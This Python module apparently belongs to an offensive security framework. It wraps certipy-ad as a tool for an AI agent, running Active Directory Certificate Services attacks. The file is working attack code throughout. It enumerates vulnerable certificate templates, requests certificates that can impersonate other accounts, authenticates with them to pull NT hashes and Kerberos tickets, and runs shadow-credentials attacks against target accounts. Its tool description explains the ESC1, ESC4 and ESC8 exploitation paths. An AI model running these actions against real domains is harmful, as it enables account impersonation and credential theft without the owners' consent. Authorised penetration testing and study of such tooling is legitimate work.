"""
AD CS (Active Directory Certificate Services) attack tool via certipy-ad.
Covers: template enumeration (find), certificate request (req), authentication (auth),
shadow credentials, and PKINIT.
"""
import re
import shlex
import shutil
import subprocess
from core import proc as runner
from core.paths import scratch_dir
from typing import Optional


def certipy_ad(domain: str, dc: str, username: str, action: str = "find",
               password: Optional[str] = None, hash: Optional[str] = None,
               ca: Optional[str] = None, template: Optional[str] = None,
               target: Optional[str] = None, pfx: Optional[str] = None,
               flags: Optional[str] = None) -> dict:
    if not shutil.which("certipy") and not shutil.which("certipy-ad"):
        return {"error": "certipy / certipy-ad not found. Install: pip install certipy-ad"}

    binary = shutil.which("certipy") or shutil.which("certipy-ad")
    action = action.lower()

    if action == "find":
        return _find(binary, domain, dc, username, password, hash, flags)
    elif action == "req":
        return _req(binary, domain, dc, username, password, hash, ca, template, target, flags)
    elif action == "auth":
        return _auth(binary, dc, pfx, flags)
    elif action == "shadow":
        return _shadow(binary, domain, dc, username, password, hash, target, flags)
    else:
        return {"error": f"Unknown action '{action}'. Use: find, req, auth, shadow"}


def _run(cmd: list, timeout: int = 120, cwd: str | None = None) -> tuple:
    try:
        proc = runner.run(cmd, capture_output=True, text=True, timeout=timeout, cwd=cwd)
        return proc.stdout + proc.stderr, proc.returncode
    except subprocess.TimeoutExpired:
        return "timed out", -1


def _find(binary, domain, dc, username, password, hash, flags):
    upn = f"{username}@{domain}"
    cmd = [binary, "find", "-u", upn, "-dc-ip", dc, "-vulnerable", "-stdout"]
    if password:
        cmd += ["-p", password]
    if hash:
        cmd += ["-hashes", hash]
    if flags:
        cmd += shlex.split(flags)

    output, rc = _run(cmd)
    templates = _parse_vulnerable_templates(output)

    return {
        "action":              "find",
        "domain":              domain,
        "vulnerable_templates": templates,
        "count":               len(templates),
        "raw":                 output[:8000],
        "_command":            " ".join(cmd),
    }


def _req(binary, domain, dc, username, password, hash, ca, template, target, flags):
    if not ca or not template:
        return {"error": "req action requires ca and template"}

    upn = f"{username}@{domain}"
    # Write the .pfx into the assessment scratch dir (persists for the later
    # `auth` step) instead of the process cwd — certipy drops the cert in its
    # working directory, so point that at scratch and collect it from there.
    out_dir = scratch_dir()
    out_dir.mkdir(parents=True, exist_ok=True)
    cmd = [binary, "req", "-u", upn, "-dc-ip", dc, "-ca", ca, "-template", template]
    if password:
        cmd += ["-p", password]
    if hash:
        cmd += ["-hashes", hash]
    if target:
        cmd += ["-target", target]
    if flags:
        cmd += shlex.split(flags)

    output, rc = _run(cmd, cwd=str(out_dir))
    pfx_files = sorted(out_dir.glob("*.pfx"), key=lambda p: p.stat().st_mtime, reverse=True)

    return {
        "action":   "req",
        "template": template,
        "ca":       ca,
        "success":  rc == 0,
        "pfx":      str(pfx_files[0]) if pfx_files else None,   # full path, ready for `auth`
        "raw":      output[:4000],
        "_command": " ".join(cmd),
    }


def _auth(binary, dc, pfx, flags):
    if not pfx:
        return {"error": "auth action requires pfx (path to .pfx certificate)"}

    cmd = [binary, "auth", "-pfx", pfx, "-dc-ip", dc]
    if flags:
        cmd += shlex.split(flags)

    output, rc = _run(cmd)
    hash_m = re.search(r"Got hash for '([^']+)':\s*(\S+)", output, re.IGNORECASE)
    tgt_m  = re.search(r"Saved TGT to '([^']+)'", output, re.IGNORECASE)

    return {
        "action":    "auth",
        "success":   rc == 0,
        "account":   hash_m.group(1) if hash_m else None,
        "nt_hash":   hash_m.group(2) if hash_m else None,
        "tgt_file":  tgt_m.group(1) if tgt_m else None,
        "raw":       output[:2000],
        "_command":  " ".join(cmd),
    }


def _shadow(binary, domain, dc, username, password, hash, target, flags):
    if not target:
        return {"error": "shadow action requires target (account to shadow)"}

    upn = f"{username}@{domain}"
    cmd = [binary, "shadow", "auto", "-u", upn, "-dc-ip", dc, "-account", target]
    if password:
        cmd += ["-p", password]
    if hash:
        cmd += ["-hashes", hash]
    if flags:
        cmd += shlex.split(flags)

    output, rc = _run(cmd)
    hash_m = re.search(r"Got hash for '([^']+)':\s*(\S+)", output, re.IGNORECASE)

    return {
        "action":   "shadow",
        "target":   target,
        "success":  rc == 0,
        "account":  hash_m.group(1) if hash_m else None,
        "nt_hash":  hash_m.group(2) if hash_m else None,
        "raw":      output[:2000],
        "_command": " ".join(cmd),
    }


def _parse_vulnerable_templates(output: str) -> list:
    templates: list = []
    current: dict = {}

    for line in output.splitlines():
        esc_m = re.search(r"ESC(\d+)", line)
        name_m = re.search(r"Template Name\s*:\s*(.+)", line)
        ca_m = re.search(r"Certificate Authorities\s*:\s*(.+)", line)
        enroll_m = re.search(r"Enrollment Rights\s*:\s*(.+)", line)

        if esc_m and current:
            current["esc"] = f"ESC{esc_m.group(1)}"
        if name_m:
            if current and current.get("name"):
                templates.append(current)
            current = {"name": name_m.group(1).strip(), "esc": None}
        if ca_m and current:
            current["ca"] = ca_m.group(1).strip()
        if enroll_m and current:
            current["enrollment"] = enroll_m.group(1).strip()

    if current and current.get("name"):
        templates.append(current)

    return templates


TOOL_DEFINITION = {
    "name": "certipy_ad",
    "description": (
        "Active Directory Certificate Services (AD CS) attacks via certipy-ad.\n"
        "Actions:\n"
        "- 'find': Enumerate certificate templates and identify vulnerable ones (ESC1-ESC8)\n"
        "- 'req': Request a certificate from a CA using a specified template\n"
        "- 'auth': Authenticate using a .pfx certificate — retrieves NT hash and TGT\n"
        "- 'shadow': Shadow credentials attack — add KeyCredential to target account, retrieve hash\n\n"
        "ESC1: Enrollee can supply arbitrary SAN → impersonate any user\n"
        "ESC4: Template allows write access → modify template for ESC1\n"
        "ESC8: NTLM relay to AD CS HTTP enrollment → get cert for relayed user"
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "domain":   {"type": "string", "description": "Active Directory domain, e.g. 'lab.local'"},
            "dc":       {"type": "string", "description": "Domain controller IP"},
            "username": {"type": "string", "description": "Domain username"},
            "action":   {"type": "string", "description": "'find', 'req', 'auth', 'shadow'. Default: find"},
            "password": {"type": "string", "description": "Password"},
            "hash":     {"type": "string", "description": "NTLM hash (LMHASH:NTHASH)"},
            "ca":       {"type": "string", "description": "Certificate Authority name (for req action)"},
            "template": {"type": "string", "description": "Template name to request (for req action)"},
            "target":   {"type": "string", "description": "Target account (for req with SAN, or shadow action)"},
            "pfx":      {"type": "string", "description": "Path to .pfx file (for auth action)"},
            "flags":    {"type": "string", "description": "Additional certipy flags"},
        },
        "required": ["domain", "dc", "username"],
    },
}
